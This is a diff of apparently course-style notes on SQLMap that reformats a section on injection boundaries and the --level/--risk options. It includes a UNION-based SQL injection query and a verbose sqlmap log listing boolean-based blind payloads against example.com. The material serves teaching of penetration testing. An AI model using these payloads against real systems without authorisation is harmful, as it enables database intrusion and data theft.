@@ -976,10 +976,12 @@ The vector `UNION ALL SELECT 1,2,VERSION()`, bounded with the prefix `%'))` a
 ```sql
 SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
 ```
+<div align="center">
+<br>
+<br>
+</div>
 
----
-
-## Level/Risk
+#### Level/Risk
 
 By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
 
@@ -990,8 +992,26 @@ For such demands, the options `--level` and `--risk` should be used:
 
 The best way to check for differences between used boundaries and payloads for different values of `--level` and `--risk`, is the usage of `-v` option to set the verbosity level. In verbosity 3 or higher (e.g. `-v 3`), messages containing the used `[PAYLOAD]` will be displayed, as follows:
 
-        shellsession
-`adampueman@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5 ...SNIP... [14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause' [14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO [14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236 ...SNIP... [14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT [14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs [14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg ...SNIP... [14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye [14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj [14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB ...SNIP... [14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1 [14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795# [14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'`
+```shell
+adampueman@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
+
+...SNIP...
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
+[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
+...SNIP...
+[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
+[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
+[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
+...SNIP...
+[14:17:07] [PAYLOAD] 1")) AND 4540=7088 AND (("hUye"="hUye
+[14:17:07] [PAYLOAD] 1"))) AND 6823=7134 AND ((("aWZj"="aWZj
+[14:17:07] [PAYLOAD] 1" AND 7613=7254 AND "NMxB"="NMxB
+...SNIP...
+[14:17:07] [PAYLOAD] 1"="1" AND 3219=7390 AND "1"="1
+[14:17:07] [PAYLOAD] 1' IN BOOLEAN MODE) AND 1847=8795#
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+```
 
 On the other hand, payloads used with the default `--level` value have a considerably smaller set of boundaries:
 
